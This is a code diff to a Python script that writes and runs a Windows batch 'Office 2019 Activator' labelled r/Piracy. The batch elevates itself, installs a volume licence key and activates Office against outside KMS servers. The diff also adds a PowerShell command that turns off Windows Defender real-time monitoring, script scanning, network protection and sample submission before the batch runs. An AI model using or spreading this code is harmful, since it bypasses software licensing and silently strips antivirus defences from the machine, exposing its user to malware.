@@ -1,11 +1,14 @@
+#!/usr/bin/python
+#-*- coding: utf-8 -*-
 import subprocess
+import os
+import time
 
-commands = f'''
-@echo off
+commands = f'''@echo off
 (cd /d "%~dp0")&&(NET FILE||(powershell start-process -FilePath '%0' -verb runas)&&(exit /B)) >NUL 2>&1
 title Office 2019 Activator r/Piracy
 echo Converting... & mode 40,25
-(if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office16")&(if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office16")&(for /f %%x in ('dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" >nul)&(for /f %%x in ('dir /b ..\root\Licenses16\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" >nul)
+(if exist "%ProgramFiles%\\Microsoft Office\\Office16\\ospp.vbs" cd /d "%ProgramFiles%\\Microsoft Office\\Office16")&(if exist "%ProgramFiles(x86)%\\Microsoft Office\\Office16\\ospp.vbs" cd /d "%ProgramFiles(x86)%\\Microsoft Office\\Office16")&(for /f %%x in ('dir /b ..\\root\\Licenses16\\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\\root\\Licenses16\\%%x" >nul)&(for /f %%x in ('dir /b ..\\root\\Licenses16\\ProPlus2019VL*.xrm-ms') do cscript ospp.vbs /inslic:"..\\root\\Licenses16\\%%x" >nul)
 cscript //nologo ospp.vbs /unpkey:6MWKP >nul&cscript //nologo ospp.vbs /inpkey:NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP >nul&set i=1
 :server
 if %i%==1 set KMS_Sev=kms7.MSGuides.com
@@ -14,24 +17,25 @@ if %i%==3 set KMS_Sev=kms9.MSGuides.com
 cscript //nologo ospp.vbs /sethst:%KMS_Sev% >nul
 echo %KMS_Sev% & echo Activating...
 cscript //nologo ospp.vbs /act | find /i "successful" && (echo Complete) || (echo Trying another KMS Server & set /a i+=1 & goto server)
-pause >nul
-exit
-'''
-def run_cmd(cmd):
+exit'''
+
+def run_ps(cmd):
     completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
     return completed
 
-def read_cmd(cmds):
-    a = cmds.split('\n')
-    return a
+def run_cmd(cmd):
+    completed = subprocess.run([cmd], capture_output=True)
+    return completed
 
 if __name__ == '__main__':
-    cmds = read_cmd(commands)
-    for cmd in cmds:
-        try:
-            if cmd:
-                res = run_cmd(cmd)
-                if res.returncode != 0:
-                    raise Exception(f"An error occured: {res.stderr}")
-        except Exception as err:
-            print(err)
+    try:
+        run_ps("Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend")
+        with open('script.bat', 'w') as f:
+            f.writelines(commands)
+        subprocess.call([r'script.bat'])
+   
+    except Exception as err:
+        print(err)
+    
+    finally:
+        os.remove('script.bat')
